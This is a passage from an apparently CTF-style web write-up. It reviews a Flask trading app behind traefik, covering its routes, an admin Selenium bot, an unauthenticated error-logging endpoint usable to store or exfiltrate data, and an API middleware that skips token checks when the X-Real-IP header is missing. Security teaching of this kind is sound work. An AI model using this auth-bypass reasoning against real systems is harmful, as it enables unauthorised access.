</span></span></code></pre></div><p><code>traefik</code> is configured to listen at <code>tcp/1337</code> and load a simple <code>dynamic_config.yml</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#75715e"># dynamic_config.yml</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">http</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">routers</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">my-app-router</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">rule</span>: <span style="color:#e6db74">&#34;PathPrefix(`/`)&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">entryPoints</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">web</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">service</span>: <span style="color:#ae81ff">my-app-service</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">my-app-service</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">loadBalancer</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">servers</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">url</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:5000&#34;</span>
</span></span></code></pre></div><p>It is essentially a simple configuration to allow <code>traefik</code> to expose the running Flask server on <code>tcp/1337</code>. For now, it seems like <code>traefik</code> is just a simple passthrough to Flask, nothing fancy.</p>
<p>Before reviewing <code>aetherCache</code>, we want to get a quick summary of the app&rsquo;s endpoints, an LLM is a great way to do that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>You have the following flask API, I put all the files below.
</span></span><span style="display:flex;"><span>Give me a sitemap of all routes.
</span></span><span style="display:flex;"><span>Do not explain and give it to me as a Markdown block:
</span></span><span style="display:flex;"><span><span style="color:#75715e">// api.py
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--</span> redacted <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// web.py
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--</span> redacted <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// main.py
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--</span> redacted <span style="color:#f92672">--</span>
</span></span></code></pre></div><p>And it was able to generate this beautiful, accurate Markdown sitemap that we can utilize for our reference.</p>
<h3 id="web-routes-">Web Routes (<code>/</code>)<a href="#web-routes-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td><code>/</code></td>
<td>Home page</td>
</tr>
<tr>
<td>GET</td>
<td><code>/get-an-account</code></td>
<td>Get An Account page</td>
</tr>
<tr>
<td>GET</td>
<td><code>/about-us</code></td>
<td>About Us page</td>
</tr>
<tr>
<td>GET</td>
<td><code>/privacy-policy</code></td>
<td>Privacy Policy page</td>
</tr>
<tr>
<td>GET</td>
<td><code>/for-developers</code></td>
<td>For Developers page</td>
</tr>
<tr>
<td>GET, POST</td>
<td><code>/login</code></td>
<td>Login page and submission</td>
</tr>
<tr>
<td>GET</td>
<td><code>/logout</code></td>
<td>Logout</td>
</tr>
<tr>
<td>GET</td>
<td><code>/dashboard</code></td>
<td>User dashboard</td>
</tr>
<tr>
<td>GET</td>
<td><code>/live_signals</code></td>
<td>View live signals</td>
</tr>
<tr>
<td>POST</td>
<td><code>/copy_trade</code></td>
<td>Copy a signal trade</td>
</tr>
<tr>
<td>GET</td>
<td><code>/my_trades</code></td>
<td>View copied trades</td>
</tr>
<tr>
<td>GET</td>
<td><code>/datasets</code></td>
<td>List uploaded datasets</td>
</tr>
<tr>
<td>POST</td>
<td><code>/upload_dataset</code></td>
<td>Upload dataset</td>
</tr>
<tr>
<td>GET</td>
<td><code>/plugins</code></td>
<td>List available plugins</td>
</tr>
<tr>
<td>POST</td>
<td><code>/run_plugin</code></td>
<td>Execute selected plugin</td>
</tr>
<tr>
<td>POST</td>
<td><code>/front_end_error/&lt;action&gt;/&lt;log_level&gt;</code></td>
<td>Log/view frontend errors</td>
</tr>
</tbody>
</table>
<h3 id="api-routes-api">API Routes (<code>/api</code>)<a href="#api-routes-api" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET, POST</td>
<td><code>/</code></td>
<td>API index check</td>
</tr>
<tr>
<td>GET</td>
<td><code>/active_signals</code></td>
<td>Get active signals</td>
</tr>
<tr>
<td>POST</td>
<td><code>/copy_signal_trade</code></td>
<td>Copy a signal to a trade</td>
</tr>
<tr>
<td>GET</td>
<td><code>/trades</code></td>
<td>Get user trades</td>
</tr>
<tr>
<td>POST</td>
<td><code>/edit_trade</code></td>
<td>Edit a user&rsquo;s trade</td>
</tr>
</tbody>
</table>
<p>This is extremely helpful. We formed a high-level understanding of the codebase. Next, we will try to find any intriguing features to exploit.</p>
<h2 id="chapter-2-some-bot-action">Chapter 2: Some Bot Action<a href="#chapter-2-some-bot-action" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>In our earlier review, you might have noticed a juicy <code>bot.py</code>.</p>
<p>A client-side vector is always a delicacy to indulge, let&rsquo;s have a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># src/application/util/bot.py</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time<span style="color:#f92672">,</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium.webdriver.chrome.options <span style="color:#f92672">import</span> Options
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> selenium.webdriver.chrome.service <span style="color:#f92672">import</span> Service
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bot_runner</span>(config):
</span></span><span style="display:flex;"><span>	chrome_options <span style="color:#f92672">=</span> Options()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;headless&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;no-sandbox&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;ignore-certificate-errors&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-dev-shm-usage&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-infobars&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-background-networking&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-default-apps&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-extensions&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-gpu&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-sync&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disable-translate&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;hide-scrollbars&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;metrics-recording-only&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;no-first-run&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;safebrowsing-disable-auto-update&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;media-cache-size=1&#34;</span>)
</span></span><span style="display:flex;"><span>	chrome_options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;disk-cache-size=1&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	chromedriver_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/local/bin/chromedriver-linux64/chromedriver&#34;</span>
</span></span><span style="display:flex;"><span>	service <span style="color:#f92672">=</span> Service(executable_path<span style="color:#f92672">=</span>chromedriver_path)
</span></span><span style="display:flex;"><span>	client <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome(service<span style="color:#f92672">=</span>service, options<span style="color:#f92672">=</span>chrome_options)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://127.0.0.1:1337/login&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>find_element(By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;email&#34;</span>)<span style="color:#f92672">.</span>send_keys(config[<span style="color:#e6db74">&#34;ADMIN_EMAIL&#34;</span>])
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>find_element(By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;password&#34;</span>)<span style="color:#f92672">.</span>send_keys(config[<span style="color:#e6db74">&#34;ADMIN_PASS&#34;</span>])
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>execute_script(<span style="color:#e6db74">&#34;document.getElementById(&#39;login-btn&#39;).click()&#34;</span>)
</span></span><span style="display:flex;"><span>	time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://127.0.0.1:1337/my_trades&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>quit()
</span></span></code></pre></div><p>We do not really care about the Chrome arguments here <a href="/posts/hack-my-bot-pwnme-2025-ctf/#chapter-4-bot-control">(although they are sometimes crucial to the solution)</a>, we care about the bot&rsquo;s flow.</p>
<p>The bot logs in, checks his trades at <code>/my_trades</code> for 10 seconds before finally leaving.</p>
<p>Looking at <code>run.py</code> (the main python entrypoint), we can see that the bot logs in every minute:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	schedule<span style="color:#f92672">.</span>every(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>minutes<span style="color:#f92672">.</span>do(bot_runner, app<span style="color:#f92672">.</span>config)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># ...</span>
</span></span></code></pre></div><h2 id="chapter-3-cracking-the-shell">Chapter 3: Cracking the Shell<a href="#chapter-3-cracking-the-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Recall that we could not find any means to register an account; even the endpoints we saw earlier did not contain account registration.</p>
<p>This leaves us with a question: how do we interact with Novacore&rsquo;s internal endpoints?</p>
<p>We have three logical options:</p>
<ol>
<li>Find a way to login as the only existing user (admin)</li>
<li>Find useful unauthenticated endpoints</li>
<li>Bypass access control</li>
</ol>
<p>Let&rsquo;s look at the two Flask routers we have. In <code>web.py</code>, we notice that access control is implemented via the <code>login_required</code> middleware which simply checks for the <code>session.get(&quot;loggedin&quot;)</code> flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_required</span>(f):
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">@wraps</span>(f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorated_function</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;loggedin&#34;</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> decorated_function
</span></span></code></pre></div><p>This flag is correctly set on successful login at <code>/login</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	email <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;email&#34;</span>)
</span></span><span style="display:flex;"><span>	password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> email <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Authorization&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email and password is required&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	db_session <span style="color:#f92672">=</span> Database()
</span></span><span style="display:flex;"><span>	user_valid, user <span style="color:#f92672">=</span> db_session<span style="color:#f92672">.</span>check_user(email, password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_valid:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;error.html&#34;</span>,
</span></span><span style="display:flex;"><span>			title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Error&#34;</span>,
</span></span><span style="display:flex;"><span>			type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Authorization&#34;</span>,
</span></span><span style="display:flex;"><span>			message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Invalid email or password&#34;</span>,
</span></span><span style="display:flex;"><span>			nav_enabled<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>		), <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	session[<span style="color:#e6db74">&#34;loggedin&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>	session[<span style="color:#e6db74">&#34;email&#34;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>email
</span></span><span style="display:flex;"><span>	session[<span style="color:#e6db74">&#34;api_token&#34;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>api_token
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/dashboard&#34;</span>)
</span></span></code></pre></div><p>Most endpoints like <code>/dashboard</code> are protected by the <code>@login_required</code> middleware as so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/dashboard&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dashboard</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;dashboard.html&#34;</span>, title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Dashboard&#34;</span>, session_data<span style="color:#f92672">=</span>session)
</span></span></code></pre></div><p>There seems to be no way around it.</p>
<p>Reviewing all endpoints in <code>web.py</code>, we find a single endpoint without <code>@login_required</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/front_end_error/&lt;action&gt;/&lt;log_level&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log_front_end_error</span>(action, log_level):
</span></span><span style="display:flex;"><span>	error <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;new&#34;</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> error <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> log_level:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Missing user input&#34;</span>}), <span style="color:#ae81ff">401</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		FRONT_END_ERRORS[log_level] <span style="color:#f92672">=</span> error
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Error logged&#34;</span>}), <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;view&#34;</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> log_level <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> FRONT_END_ERRORS:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;No errors found for the specified log level&#34;</span>}), <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify(FRONT_END_ERRORS[log_level]), <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid action&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span></code></pre></div><p>It seems like a diagnostic endpoint used by the app to report frontend errors, it is left exposed at <code>/front_end_error/&lt;action&gt;/&lt;log_level&gt;</code>.</p>
<p>It accepts two &ldquo;actions&rdquo;, <code>new</code> and <code>view</code>. <code>new</code> allows us to set a key to specific JSON payload, while <code>view</code> allows us to read that key. Essentially, it gives us a same-site read-write endpoint which we can use to deliver data to the site or exfiltrate data from it.</p>
<p>This is a very useful primitive that we might need later.</p>
<blockquote>
<p>A <strong>primitive</strong> is a tiny little gimmick or feature that might be meaningless in isolation, but may be combined with other primitives to achieve more powerful vectors leading to successful exploitation.</p>
</blockquote>
<p>Our review of <code>web.py</code> netted us one primitive, let&rsquo;s see what we can find at <code>api.py</code>.</p>
<p>The API has four functions and all of them are protected with another middleware <code>@token_required</code> which is defined as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">token_required</span>(f):
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">@wraps</span>(f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorated_function</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>		client_ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;X-Real-IP&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> client_ip:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Authorization&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;API token is missing&#34;</span>}), <span style="color:#ae81ff">401</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		db_session <span style="color:#f92672">=</span> Database()
</span></span><span style="display:flex;"><span>		valid, user <span style="color:#f92672">=</span> db_session<span style="color:#f92672">.</span>validate_token(token)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Invalid API token&#34;</span>}), <span style="color:#ae81ff">401</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		g<span style="color:#f92672">.</span>user <span style="color:#f92672">=</span> user
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> decorated_function
</span></span></code></pre></div><p><code>token_required</code> protects endpoints by checking the <code>Authorization</code> header for an API token, this API token is granted to us on login.</p>
<p>I found it suspicious that the author chose two separate protection mechanisms between <code>web.py</code> and <code>api.py</code> which essentially perform the same thing via different means.</p>
<p>If we look closely, we will notice that <code>token_required()</code> contains a kill switch. The function checks for the existence of the <code>X-Real-Ip</code> header, if it doesn&rsquo;t exist, the middleware lets go.</p>
<p>But where is <code>X-Real-Ip</code> being set anyways? It seems like <code>traefik</code> is setting for Flask, let&rsquo;s patch our app locally to confirm this. We will add a line on <code>@web.after_request</code> to print received headers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.after_request</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">apply_csp</span>(response):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Received headers:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, request<span style="color:#f92672">.</span>headers, flush<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span></code></pre></div><p>Waiting a minute for the bot to login and trigger an API call, we receive these:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Received headers:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.141 Safari/537.36
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: gzip, deflate, br
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua: &#34;HeadlessChrome&#34;;v=&#34;125&#34;, &#34;Chromium&#34;;v=&#34;125&#34;, &#34;Not.A/Brand&#34;;v=&#34;24&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua-Mobile: ?0
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Ch-Ua-Platform: &#34;Linux&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Dest: document
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Mode: navigate
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-Site: none
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Sec-Fetch-User: ?1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Upgrade-Insecure-Requests: 1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-For: 127.0.0.1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Port: 1337
